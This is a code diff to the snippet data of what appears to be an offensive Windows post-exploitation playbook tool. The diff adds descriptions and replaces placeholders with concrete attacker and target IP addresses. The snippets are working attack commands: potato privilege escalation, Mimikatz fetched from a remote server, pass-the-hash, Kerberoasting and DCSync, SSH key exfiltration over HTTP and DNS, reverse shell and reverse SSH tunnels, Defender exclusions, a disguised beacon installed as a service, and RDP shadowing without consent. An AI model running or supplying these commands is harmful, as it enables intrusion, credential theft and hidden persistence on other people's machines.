     code: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c powershell -enc BASE64\" -t *",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P4-EXPLOIT] PrintSpoofer (SeImpersonate)",
+    desc: "Abuse SeImpersonate via print spooler. Works on newer Windows. Replace BASE64.",
     code: "PrintSpoofer.exe -i -c \"powershell -enc BASE64\"",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P4-EXPLOIT] GodPotato (SeImpersonate)",
-    code: "GodPotato.exe -cmd \"cmd /c whoami > C:\\\\temp\\\\proof.txt\"",
+    desc: "SeImpersonate abuse that works across more Windows versions. Change command.",
+    code: "GodPotato.exe -cmd \"cmd /c whoami > C:\\temp\\proof.txt\"",
     tags: ["playbook", "privesc"],
     accent: "#ff5722"
   },
   {
     title: "[P5-EXPLOIT] Crack SAM Offline",
-    code: "secretsdump.py -sam sam.save -system system.save LOCAL\\nhashcat -m 1000 hashes.txt rockyou.txt",
+    desc: "Extract hashes from SAM/SYSTEM dumps with secretsdump, crack with hashcat.",
+    code: "secretsdump.py -sam sam.save -system system.save LOCAL\nhashcat -m 1000 hashes.txt rockyou.txt",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P5-EXPLOIT] Mimikatz LogonPasswords",
-    code: "IEX (New-Object Net.WebClient).DownloadString('http://VPS/Invoke-Mimikatz.ps1')\\nInvoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
+    desc: "Download and run Invoke-Mimikatz to dump cached credentials from memory.",
+    code: "IEX (New-Object Net.WebClient).DownloadString('http://168.144.166.97:8889/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P5-EXPLOIT] pypykatz LSASS Parse",
+    desc: "Parse LSASS dump offline with pypykatz to extract credentials. Run on attacker.",
     code: "pypykatz lsa minidump lsass.dmp",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P7-EXPLOIT] Pass-the-Hash",
-    code: "impacket-psexec DOMAIN/user@TARGET -hashes :NTHASH\\nimpacket-wmiexec DOMAIN/user@TARGET -hashes :NTHASH",
+    desc: "Use NTLM hash for lateral movement without password. Run from attacker box.",
+    code: "impacket-psexec WORKGROUP/adminvm1@4.200.69.210 -hashes :NTHASH\nimpacket-wmiexec WORKGROUP/adminvm1@4.200.69.210 -hashes :NTHASH",
     tags: ["playbook", "lateral"],
     accent: "#ff5722"
   },
   {
     title: "[P7-EXPLOIT] Evil-WinRM Shell",
-    code: "evil-winrm -i TARGET -u user -p password\\nevil-winrm -i TARGET -u user -H NTHASH",
+    desc: "Get interactive WinRM shell with password or hash. Run from attacker box.",
+    code: "evil-winrm -i 4.200.69.210 -u adminvm1 -p password\nevil-winrm -i 4.200.69.210 -u adminvm1 -H NTHASH",
     tags: ["playbook", "lateral"],
     accent: "#ff5722"
   },
   {
     title: "[P8-EXPLOIT] Kerberoast Attack",
-    code: "Rubeus.exe kerberoast /outfile:hashes.txt\\nimpacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC -request\\nhashcat -m 13100 hashes.txt rockyou.txt",
+    desc: "Request service tickets then crack offline. Rubeus on target, impacket from attacker.",
+    code: "Rubeus.exe kerberoast /outfile:hashes.txt\nimpacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC -request\nhashcat -m 13100 hashes.txt rockyou.txt",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P8-EXPLOIT] AS-REP Roast",
-    code: "Rubeus.exe asreproast /outfile:asrep.txt\\nimpacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC\\nhashcat -m 18200 asrep.txt rockyou.txt",
+    desc: "Attack accounts with Kerberos pre-auth disabled. Crack AS-REP hashes offline.",
+    code: "Rubeus.exe asreproast /outfile:asrep.txt\nimpacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC\nhashcat -m 18200 asrep.txt rockyou.txt",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P8-EXPLOIT] DCSync Attack",
-    code: "mimikatz # lsadump::dcsync /domain:DOMAIN /user:Administrator\\nimpacket-secretsdump DOMAIN/user:pass@DC_IP",
+    desc: "Replicate domain controller to extract all password hashes. Requires DC replication rights.",
+    code: "mimikatz # lsadump::dcsync /domain:DOMAIN /user:Administrator\nimpacket-secretsdump DOMAIN/user:pass@DC_IP",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P8-EXPLOIT] GPP Password Decrypt",
+    desc: "Decrypt Group Policy Preferences cpassword using known AES key. Paste cpassword value.",
     code: "gpp-decrypt ENCRYPTED_CPASSWORD",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P3-EXPLOIT] Export All WiFi",
-    code: "netsh wlan export profile key=clear folder=C:\\\\temp",
+    desc: "Export all WiFi profiles with cleartext passwords to XML files.",
+    code: "netsh wlan export profile key=clear folder=C:\\temp",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P3-EXPLOIT] Vault Credential Dump",
-    code: "mimikatz # vault::cred /patch\\nmimikatz # vault::list",
+    desc: "Dump Windows Credential Vault entries using mimikatz.",
+    code: "mimikatz # vault::cred /patch\nmimikatz # vault::list",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P3-EXPLOIT] Decode Unattend Password",
+    desc: "Decode base64 password found in unattend.xml or sysprep files.",
     code: "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('BASE64_PASSWORD'))",
     tags: ["playbook", "postexploit"],
     accent: "#ff5722"
   },
   {
     title: "[P6-EXPLOIT] WMI Event Persistence",
-    code: "$F=Set-WmiInstance -Class __EventFilter -Namespace root\\\\subscription -Arguments @{Name='BD';EventNamespace='root\\\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"}\\n$C=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\\\subscription -Arguments @{Name='BD';CommandLineTemplate='powershell -enc BASE64'}\\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\\\subscription -Arguments @{Filter=$F;Consumer=$C}",
+    desc: "Create WMI event subscription for fileless persistence. Triggers every 60 seconds.",
+    code: "$F=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='BD';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"}\n$C=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{Name='BD';CommandLineTemplate='powershell -enc BASE64'}\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{Filter=$F;Consumer=$C}",
     tags: ["playbook", "persist"],
     accent: "#ff5722"
   },
   {
     title: "[P6-EXPLOIT] DLL Hijack Payload",
-    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=VPS LPORT=4444 -f dll -o evil.dll",
+    desc: "Generate malicious DLL for hijacking. Place in writable path searched before legit DLL.",
+    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=168.144.166.97 LPORT=4444 -f dll -o evil.dll",
     tags: ["playbook", "persist"],
     accent: "#ff5722"
   },
   {
     title: "[P9-EXPLOIT] DNS Exfil",
-    code: "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\\\secret.txt'))\\n($d -split '(.{60})' | ?{$_}) | %{ nslookup \"$_.attacker.com\" }",
+    desc: "Exfiltrate file contents via DNS queries. Replace attacker.com with your domain.",
+    code: "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\secret.txt'))\n($d -split '(.{60})' | ?{$_}) | %{ nslookup \"$_.attacker.com\" }",
     tags: ["playbook", "postexploit", "c2"],
     accent: "#ff5722"
   },
   {
     title: "Process List with Command Lines",
+    desc: "List all running processes with their full command line arguments.",
     code: "Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine | Format-Table -Wrap",
     tags: ["ps", "recon", "playbook"],
     accent: "#00f0ff"
   },
   {
     title: "Process List with Owner",
+    desc: "List processes with the user account running each one.",
     code: "Get-Process -IncludeUserName | Select-Object Name, Id, UserName, Path | Format-Table -AutoSize",
     tags: ["ps", "recon", "playbook"],
     accent: "#00f0ff"
   },
   {
     title: "Services Running as SYSTEM",
+    desc: "Find services running as LocalSystem - potential privesc targets.",
     code: "Get-WmiObject win32_service | Where-Object {$_.StartName -match 'LocalSystem'} | Select-Object Name, PathName, State",
     tags: ["ps", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Services with User Creds",
+    desc: "Find services running as domain/local users - creds may be extractable.",
     code: "Get-WmiObject win32_service | Where-Object {$_.StartName -notmatch 'LocalSystem|LocalService|NetworkService' -and $_.StartName -ne $null} | Select-Object Name, StartName, PathName",
     tags: ["ps", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Listening Ports with PID",
+    desc: "Show all listening TCP ports with process IDs.",
     code: "netstat -ano | findstr LISTENING",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Listening Ports + Process Name",
+    desc: "Show listening ports with process names - cleaner than netstat.",
     code: "Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess, @{n='Process';e={(Get-Process -Id $_.OwningProcess).Name}}",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Established Connections",
+    desc: "Show active network connections to remote hosts.",
     code: "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, @{n='Process';e={(Get-Process -Id $_.OwningProcess).Name}}",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Find Web Servers (Ports)",
+    desc: "Find processes listening on common web server ports.",
     code: "Get-NetTCPConnection -State Listen | Where-Object {$_.LocalPort -in 80,443,8080,8443,8000,3000,5000} | Select-Object LocalPort, @{n='Proc';e={(Get-Process -Id $_.OwningProcess).Name}}",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "IIS Sites Enum",
+    desc: "List IIS websites and their physical paths. Requires IIS installed.",
     code: "Import-Module WebAdministration; Get-WebSite | Select-Object Name, PhysicalPath",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Find Config Files",
-    code: "Get-ChildItem -Path C:\\\\ -Recurse -Include 'web.config','app.config','*.ini','appsettings.json' -ErrorAction SilentlyContinue 2>$null | Select-Object FullName",
+    desc: "Search entire drive for config files containing credentials.",
+    code: "Get-ChildItem -Path C:\\ -Recurse -Include 'web.config','app.config','*.ini','appsettings.json' -ErrorAction SilentlyContinue 2>$null | Select-Object FullName",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Find Connection Strings",
-    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.config','*.json' -EA SilentlyContinue | Select-String 'connectionString|password|pwd' | Select-Object Path,Line",
+    desc: "Grep config files for connection strings and passwords.",
+    code: "Get-ChildItem C:\\ -Recurse -Include '*.config','*.json' -EA SilentlyContinue | Select-String 'connectionString|password|pwd' | Select-Object Path,Line",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Installed Programs",
-    code: "Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select-Object DisplayName, DisplayVersion | Sort DisplayName",
+    desc: "List all installed software from registry.",
+    code: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion | Sort DisplayName",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Find Vuln Software",
+    desc: "Search for commonly vulnerable software packages.",
     code: "wmic product get name,version | findstr -i 'java apache tomcat jenkins jboss weblogic'",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Scheduled Tasks (3rd Party)",
+    desc: "Find non-Microsoft scheduled tasks - potential persistence or privesc.",
     code: "Get-ScheduledTask | Where-Object {$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author",
     tags: ["ps", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Scheduled Tasks Paths",
+    desc: "Show scheduled task names and executable paths.",
     code: "schtasks /query /fo LIST /v | findstr /i 'TaskName Task.To.Run'",
     tags: ["cmd", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Find Writable Dirs (Program Files)",
-    code: "icacls 'C:\\\\Program Files\\\\*' 2>nul | findstr /i '(F) (M) (W) Everyone Users'",
+    desc: "Find directories in Program Files writable by low-priv users.",
+    code: "icacls \"C:\\Program Files\\*\" 2>nul | findstr /i \"(F) (M) (W) Everyone Users\"",
     tags: ["cmd", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Find Backup Files",
-    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.bak','*.backup','*.old','*.save' -EA SilentlyContinue | Select-Object FullName",
+    desc: "Search for backup files that may contain old credentials.",
+    code: "Get-ChildItem C:\\ -Recurse -Include '*.bak','*.backup','*.old','*.save' -EA SilentlyContinue | Select-Object FullName",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Find Database Files",
-    code: "Get-ChildItem C:\\\\ -Recurse -Include '*.mdf','*.sqlite','*.db' -EA SilentlyContinue | Select-Object FullName",
+    desc: "Search for database files to extract data.",
+    code: "Get-ChildItem C:\\ -Recurse -Include '*.mdf','*.sqlite','*.db' -EA SilentlyContinue | Select-Object FullName",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Find Scripts",
-    code: "Get-ChildItem C:\\\\Users -Recurse -Include '*.ps1','*.bat','*.cmd','*.vbs' -EA SilentlyContinue | Select-Object FullName",
+    desc: "Search user directories for scripts that may contain credentials.",
+    code: "Get-ChildItem C:\\Users -Recurse -Include '*.ps1','*.bat','*.cmd','*.vbs' -EA SilentlyContinue | Select-Object FullName",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Find SSH Keys",
-    code: "Get-ChildItem C:\\\\Users -Recurse -Include 'id_rsa','id_ed25519','*.pem','*.ppk' -EA SilentlyContinue | Select-Object FullName",
+    desc: "Search for SSH private keys across all user directories.",
+    code: "Get-ChildItem C:\\Users -Recurse -Include 'id_rsa','id_ed25519','*.pem','*.ppk' -EA SilentlyContinue | Select-Object FullName",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Find Cloud Creds",
-    code: "Get-ChildItem C:\\\\Users -Recurse -Include 'credentials','config' -Path '*\\\\.aws','*\\\\.azure' -EA SilentlyContinue",
+    desc: "Search for AWS/Azure credential files.",
+    code: "Get-ChildItem C:\\Users -Recurse -Include 'credentials','config' -Path '*\\.aws','*\\.azure' -EA SilentlyContinue",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Startup Programs",
+    desc: "List programs that run at user login.",
     code: "Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location",
     tags: ["ps", "recon", "persist"],
     accent: "#00f0ff"
   },
   {
     title: "Registry Run Keys",
-    code: "Get-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run','HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -EA SilentlyContinue",
+    desc: "Check registry autorun keys for persistence mechanisms.",
+    code: "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -EA SilentlyContinue",
     tags: ["ps", "recon", "persist"],
     accent: "#00f0ff"
   },
   {
     title: "3rd Party Drivers",
+    desc: "List non-Microsoft drivers - potential vuln attack surface.",
     code: "driverquery /v | findstr /v Microsoft",
     tags: ["cmd", "recon", "privesc"],
     accent: "#00f0ff"
   },
   {
     title: "Hotfixes Installed",
+    desc: "List installed Windows patches for missing patch identification.",
     code: "wmic qfe get HotFixID,InstalledOn,Description",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Named Pipes",
-    code: "[IO.Directory]::GetFiles('\\\\\\\\.\\\\pipe\\\\')",
+    desc: "List named pipes - used for IPC and potential privesc.",
+    code: "[IO.Directory]::GetFiles('\\\\.\\pipe\\')",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "AntiVirus Product",
+    desc: "Check what AV is installed and its status.",
     code: "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, productState",
     tags: ["ps", "recon", "defender"],
     accent: "#00f0ff"
   },
   {
     title: "Environment Variables",
+    desc: "List all environment variables - check for sensitive data.",
     code: "Get-ChildItem Env: | Format-Table -Wrap",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Shares on This Machine",
+    desc: "List SMB shares on the local machine.",
     code: "net share",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Mounted Drives",
+    desc: "List all mounted drives with space usage.",
     code: "Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free",
     tags: ["ps", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Create Unkillable File (SYSTEM Owner)",
+    desc: "Create a file that cannot be deleted by admins. Useful for persistent implants.",
     code: "$p='C:\\Windows\\Tasks\\legit.txt'; Set-Content $p 'protected'; icacls $p /setowner 'NT AUTHORITY\\SYSTEM'; icacls $p /deny 'Administrators:(D)' /deny 'Everyone:(D)'",
     tags: ["ps", "persist", "postexploit"],
     accent: "#e74c3c"
   },
   {
     title: "Create Unkillable File (TrustedInstaller)",
+    desc: "Set TrustedInstaller as owner - even SYSTEM cannot delete without takeown.",
     code: "icacls C:\\Windows\\Tasks\\file.txt /setowner 'NT SERVICE\\TrustedInstaller'",
     tags: ["cmd", "persist", "postexploit"],
     accent: "#e74c3c"
   },
   {
     title: "Delete Protected File (Need SYSTEM)",
+    desc: "Take ownership and delete a protected file. Requires admin.",
     code: "takeown /f C:\\Windows\\Tasks\\file.txt /a; icacls C:\\Windows\\Tasks\\file.txt /grant Administrators:F; del C:\\Windows\\Tasks\\file.txt",
     tags: ["cmd", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Find All SSH Keys",
+    desc: "Search all user .ssh directories for private keys.",
     code: "Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Select-Object FullName",
     tags: ["ps", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "Read SSH Private Key",
+    desc: "Display SSH private key contents. Replace victim with target username.",
     code: "type C:\\Users\\victim\\.ssh\\id_rsa\ntype C:\\Users\\victim\\.ssh\\id_ed25519",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Exfil SSH Keys via HTTP",
-    code: "$k = Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://VPS:8080/keys' -Method POST -Body $k",
+    desc: "Send all SSH keys to VPS receiver on port 8083.",
+    code: "$k = Get-ChildItem C:\\Users\\*\\.ssh\\* -EA SilentlyContinue | Get-Content -Raw; IWR -Uri 'http://168.144.166.97:8083/keys' -Method POST -Body $k",
     tags: ["ps", "postexploit", "c2"],
     accent: "#ff9800"
   },
   {
     title: "Base64 SSH Key for Copy",
+    desc: "Base64 encode SSH key for manual copy/paste exfil.",
     code: "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\victim\\.ssh\\id_rsa'))",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Install OpenSSH Server",
+    desc: "Install and enable OpenSSH server for persistent SSH access.",
     code: "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0\nStart-Service sshd\nSet-Service -Name sshd -StartupType Automatic",
     tags: ["ps", "persist", "lateral"],
     accent: "#e74c3c"
   },
   {
     title: "OpenSSH Firewall Rule",
+    desc: "Allow inbound SSH connections on port 22.",
     code: "New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22",
     tags: ["ps", "firewall", "persist"],
     accent: "#3498db"
   },
   {
     title: "Add SSH Authorized Key",
+    desc: "Add your public key for passwordless SSH access. Replace YOUR_PUBKEY_HERE.",
     code: "mkdir C:\\Users\\Administrator\\.ssh -Force; Add-Content C:\\Users\\Administrator\\.ssh\\authorized_keys 'YOUR_PUBKEY_HERE'",
     tags: ["ps", "persist", "lateral"],
     accent: "#e74c3c"
   },
   {
     title: "Reverse SSH Tunnel to VPS",
-    code: "ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@VPS_IP -N -f",
+    desc: "Create reverse SSH tunnel so VPS can SSH back to target.",
+    code: "ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@168.144.166.97 -N -f",
     tags: ["cmd", "c2", "persist"],
     accent: "#ff6b35"
   },
   {
     title: "Persistent Reverse SSH Task",
-    code: "schtasks /create /tn 'Update' /tr 'ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@VPS_IP -N' /sc onstart /ru SYSTEM /f",
+    desc: "Scheduled task to maintain reverse SSH tunnel on boot.",
+    code: "schtasks /create /tn 'Update' /tr 'ssh -R 2222:localhost:22 -i C:\\Users\\Public\\key root@168.144.166.97 -N' /sc onstart /ru SYSTEM /f",
     tags: ["cmd", "persist", "c2"],
     accent: "#e74c3c"
   },
   {
     title: "Connect via Reverse SSH (VPS)",
+    desc: "From VPS, connect through the reverse tunnel to target.",
     code: "ssh -p 2222 localhost",
     tags: ["linux", "c2", "lateral"],
     accent: "#00ff41"
   },
   {
     title: "Add Exclusion Paths",
+    desc: "Exclude directories from Defender scanning - for payload staging.",
     code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks','C:\\Windows\\Temp','C:\\ProgramData','C:\\Users\\Public'",
     tags: ["ps", "defender", "evasion"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion Extensions",
+    desc: "Exclude file extensions from Defender scanning.",
     code: "Add-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat'",
     tags: ["ps", "defender", "evasion"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion Processes",
+    desc: "Exclude processes from Defender monitoring.",
     code: "Add-MpPreference -ExclusionProcess 'powershell.exe','cmd.exe','python.exe'",
     tags: ["ps", "defender", "evasion"],
     accent: "#ff2a6d"
   },
   {
     title: "Full SYSTEM Persistence Chain",
-    code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'\nIWR -Uri 'http://VPS/beacon.exe' -OutFile 'C:\\Windows\\Tasks\\svchost.exe'\nicacls 'C:\\Windows\\Tasks\\svchost.exe' /setowner 'NT AUTHORITY\\SYSTEM'\nsc create WindowsUpdate binPath= 'C:\\Windows\\Tasks\\svchost.exe' start= auto",
+    desc: "Complete persistence chain: exclusion, download, protect, service. Replace VPS with your IP.",
+    code: "Add-MpPreference -ExclusionPath 'C:\\Windows\\Tasks'\nIWR -Uri 'http://168.144.166.97:8889/beacon.exe' -OutFile 'C:\\Windows\\Tasks\\svchost.exe'\nicacls 'C:\\Windows\\Tasks\\svchost.exe' /setowner 'NT AUTHORITY\\SYSTEM'\nsc create WindowsUpdate binPath= 'C:\\Windows\\Tasks\\svchost.exe' start= auto",
     tags: ["ps", "persist", "playbook"],
     accent: "#ffeb3b"
   },
   {
     title: "RDP List Sessions",
+    desc: "List all RDP and console sessions on the machine.",
     code: "qwinsta",
     tags: ["cmd", "recon", "postexploit"],
     accent: "#00f0ff"
   },
   {
     title: "RDP Shadow (Watch Only)",
+    desc: "Spy on a user's RDP session. Replace SESSION_ID from qwinsta output.",
     code: "mstsc /shadow:SESSION_ID /noConsentPrompt",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "RDP Shadow (Full Control)",
+    desc: "Take control of user's RDP session. Replace SESSION_ID from qwinsta.",
     code: "mstsc /shadow:SESSION_ID /noConsentPrompt /control",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Enable RDP Shadow (Registry)",
+    desc: "Enable shadowing without user consent (value 2).",
     code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f",
     tags: ["cmd", "persist", "postexploit"],
     accent: "#e74c3c"
   },
   {
     title: "Disable RDP Shadow",
+    desc: "Disable RDP shadowing completely (value 0).",
     code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 0 /f",
     tags: ["cmd", "defender"],
     accent: "#ff2a6d"
   },
   {
     title: "Check RDP Shadow Policy",
+    desc: "Check current RDP shadow policy setting.",
     code: "reg query 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow",
     tags: ["cmd", "recon"],
     accent: "#00f0ff"
   },
   {
     title: "Force RDP Shadow Consent",
+    desc: "Require user consent for shadowing (defensive).",
     code: "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 1 /f",
     tags: ["cmd", "defender"],
     accent: "#ff2a6d"
   },
   {
     title: "Read PS History (Target User)",
-    code: "type C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt",
+    desc: "Read PowerShell command history of target user. Replace victim with username.",
+    code: "type C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
     tags: ["cmd", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Read All Users PS History",
-    code: "Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\*.txt | ForEach-Object { Write-Host \"=== $_ ===\"; Get-Content $_ }",
+    desc: "Read PowerShell history from all users on the machine.",
+    code: "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*.txt | ForEach-Object { Write-Host \"=== $_ ===\"; Get-Content $_ }",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Enable PS Transcription",
-    code: "New-Item 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Force; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Name EnableTranscripting -Value 1; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription' -Name OutputDirectory -Value 'C:\\\\Windows\\\\Temp\\\\ps_logs'",
+    desc: "Enable PowerShell transcription logging to capture all commands.",
+    code: "New-Item 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Force; Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name EnableTranscripting -Value 1; Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' -Name OutputDirectory -Value 'C:\\Windows\\Temp\\ps_logs'",
     tags: ["ps", "postexploit", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Read PS Transcription Logs",
-    code: "Get-ChildItem C:\\\\Windows\\\\Temp\\\\ps_logs\\\\*.txt | Get-Content",
+    desc: "Read captured PowerShell transcription logs.",
+    code: "Get-ChildItem C:\\Windows\\Temp\\ps_logs\\*.txt | Get-Content",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Enable Script Block Logging",
-    code: "New-Item 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging' -Force; Set-ItemProperty 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1",
+    desc: "Enable PowerShell script block logging for deobfuscated command capture.",
+    code: "New-Item 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Force; Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -Name EnableScriptBlockLogging -Value 1",
     tags: ["ps", "postexploit", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Read Script Block Logs",
+    desc: "Read PowerShell script block logs from Event Viewer.",
     code: "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 100 | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message",
     tags: ["ps", "postexploit", "recon"],
     accent: "#ff9800"
   },
   {
     title: "Monitor Process Creation",
+    desc: "List all running processes with command lines (snapshot).",
     code: "Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine | Format-Table -Wrap",
     tags: ["ps", "postexploit", "recon"],
     accent: "#00f0ff"
   },
   {
